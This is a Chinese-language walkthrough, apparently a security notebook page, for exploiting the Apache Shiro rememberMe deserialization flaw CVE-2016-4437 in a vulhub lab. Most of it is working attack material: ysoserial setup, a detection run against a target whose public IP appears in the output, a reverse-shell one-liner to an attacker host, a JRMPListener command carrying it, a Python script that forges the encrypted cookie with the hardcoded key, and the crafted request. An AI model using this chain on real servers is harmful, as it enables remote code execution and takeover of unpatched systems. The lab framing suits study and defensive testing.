---
description: >-
  Shiro是一个用于Java应用程序的开源安全框架，用于身份认证、授权和会话管理等功能。然而，Shiro在过去存在着一个严重的安全漏洞，即Shiro反序列化漏洞（Shiro
  Deserializati
---

# CVE-2016-4437

### 漏洞原理：

Apache Shiro框架提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。\
Shiro对rememberMe的cookie做了加密处理，shiro在CookieRememberMeManaer类中将cookie中rememberMe字段内容分别进行序列化、AES加密、Base64编码操作。\
在识别身份的时候，需要对Cookie里的rememberMe字段解密。根据加密的顺序，不难知道解密的顺序为：

* 获取rememberMe cookie
* base64 decode
* 解密AES（加密密钥硬编码）
* 反序列化（未作过滤处理）\
  但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞

### CVE-2016-4437环境搭建：

我这里是用docker部署的环境

{% embed url="https://github.com/vulhub/vulhub" %}

下载好以后cd想要搭建的漏洞环境的文件夹中，执行以下命令

```
docker-compose up -d
```

攻击机环境准备

这里用到了一个常用的Java反序列化漏洞利用工具ysoserial，下面是下载地址

{% embed url="https://github.com/frohoff/ysoserial.git" %}

下载好以后cd到ysoserial包中，构建环境，完成以后就可以使用ysoserial了

{% code lineNumbers="true" %}
```
apt-get update
apt-get install maven
cd ysoserial
mvn package -DskipTests
```
{% endcode %}

下载ysoserial的java包

{% embed url="https://github.com/frohoff/ysoserial/releases/tag/v0.0.6" %}

```
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

### 漏洞探测：

访问目地址，用户名密码这里随便输了，勾选remember me

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

使用Shiro\_exploit用于检测与利用Apache Shiro反序列化漏洞脚本

下载该poc

{% embed url="https://github.com/insightglacier/Shiro_exploit" %}

需要把这一行的java改成/root/Desktop/test/jdk1.8.0\_202/bin/java，也就是需要指定java版本，不然会出现使用不了的问题

```
 popen = subprocess.Popen(['/root/Desktop/test/jdk1.8.0_202/bin/java','-jar',fp,gadget,command],
```

```
┌──(root㉿kali)-[~/Desktop/test/Shiro_exploit]
└─# python2 shiro_exploit.py -u http://xx.xx.xx.7:8080/doLogin
checking url:http://43.143.138.7:8080/doLogin
try CipherKey :kPH+bIxk5D2deZiIxcaaaA==
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
generator payload done.
send payload ok.
checking.....

vulnerable:True url:http://43.143.138.7:8080/doLogin    CipherKey:kPH+bIxk5D2deZiIxcaaaA==
```

运行脚本发现存在漏洞key为：kPH+bIxk5D2deZiIxcaaaA==

生产反弹shell的payload，这里有一个生产反弹shell的地址

{% embed url="https://www.revshells.com/" %}

```
bash -i >& /dev/tcp/xx.xx.xx.xx/9992 0>&1
```

vps上执行命令，通过 ysoserial中的JRMP监听模块,这里监听了9991端口，我这里的java版本用的是1.8，这里面有一段base64编码是上面反弹shell的base64编码，反弹shell的端口我这边监听9992端口

{% code lineNumbers="true" %}
```sh
./java -cp ../../ysoserial-all.jar ysoserial.exploit.JRMPListener 9995 CommonsBeanutils1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMjkvOTk5MiAwPiYx}|{base64,-d}|{bash,-i}'
nc -lnvp 9992
```
{% endcode %}

payloads/JRMPClient 是结合 exploit/JRMPListener 使用的； JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后Server中进行反序列化操作，并开启指定端口，然后在通过JRMPClient去发送攻击 payload； payloads/JRMPClient 生成的 payload 是发送给目标机器的，exploit/JRMPListener 是在自己服务器上使用的。

伪造cookie

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['/root/Desktop/test/jdk1.8.0_202/bin/java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
 
if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])   
print "rememberMe={0}".format(payload.decode())
```

这个poc的java也需要指定修改下面这一行中的内容，其他包名如果不正确也需要修改

```
popen = subprocess.Popen(['/root/Desktop/test/jdk1.8.0_202/bin/java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
```

在执行这边脚本的时候发现一个问题，会出现一个报错

```
ImportError: No module named Crypto.Cipher  
```

这里需要用pip2安装pycryptodome

```
pip2 install pycryptodome
```

如果没有pip2 就需要先安装pip2

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py 
```

python shiro\_pc.py 攻击者IP:攻击者监听的java端口

```
┌──(root㉿kali)-[~/Desktop/test/Shiro_exploit]
└─# python2 shiro_poc.py xx.xx.xx.xx:9995 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rememberMe=i8DIfRooQ6yl7xNi7x/maIx9xXtpAlmU7Sqw6ghNmAY4NMzDTW3rL9GZYfATAngIQpE4U8rgxBjUZ0yq4MPO0XZtPq/lfXTMfl//6L/hzCOpE7M8S58JQCvoeh8/r5+PSrYEu/kSJpudHiweBvi0luJocHKnmqeDBCW24pOlCCm7SujEXeUKo/kmgcCXIbZqew3fm8DUrgxDmD2b+clJEsPTOLEBWPH7SZqRhtfKJJR8thtlL4dIcKBbbdrsctgpTn/54+u2cVzwbsukFLE7JDKiQb5gJZdoBQQyKv4nw2jX2KRbKVvlg+rSNvhqgr/XehW1lQqRYfiUTCV0hTotAa2JMRh8oxdr99T0pb8Gk+LEWnaNLfUL2yGU4DiKsX5s0/JOU5IPO6dPiaOuAilrpg==
```

将生成的的rememberMe信息放入到Burp请求包中，发送请求

<pre><code>POST /doLogin HTTP/1.1
Host: 192.168.254.130:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://192.168.254.130:8080
Connection: close
Referer: http://192.168.254.130:8080/login
Cookie: JSESSIONID=1A1D26C9046F377DF661ACE23A3FF433;<a data-footnote-ref href="#user-content-fn-1">rememberMe=m8TSOozYQRuapaXGMjgfAkXzPJplnG5DURFqQMVxMhKYvXYz7bpayoyu+rBBFk+NBGL3AZItTY6t6iyJdtmRlhw8Q2w1X9D+uoI4a4rRn85agBiZznpebK47J1raHa9kzVAFplA2f6Mkh3q3RQHmEgdnyY9GZPDo9sk0HDKhjc7RUzP/cBS+8mfHM4BXdNCctXY3v6By9PgvSlxQfkbgaU7SsDVZsFqNTKMDzT0b6fojbCIIb+lF+lCdHzGuyYi4K02gb4WKNLDe/e/l7K7wzS0hshe3+LlqRNi2tcKqdaq8DxRMo/Ndfsc78VhIBgEWDn6KSPXJ2N8XQny2YEREayo8+lL9vymimShJui6ueTdC7fTnbPorW4f/zW5YxdcyX7UjNq+juPpv/rX1MFrvXQ==</a>
Upgrade-Insecure-Requests: 1

username=root&#x26;password=123654&#x26;rememberme=remember-me
</code></pre>

这里可以看到开启的JRMP Server 服务有了响应

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

nc监听的端口返回了shell

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

[^1]: 
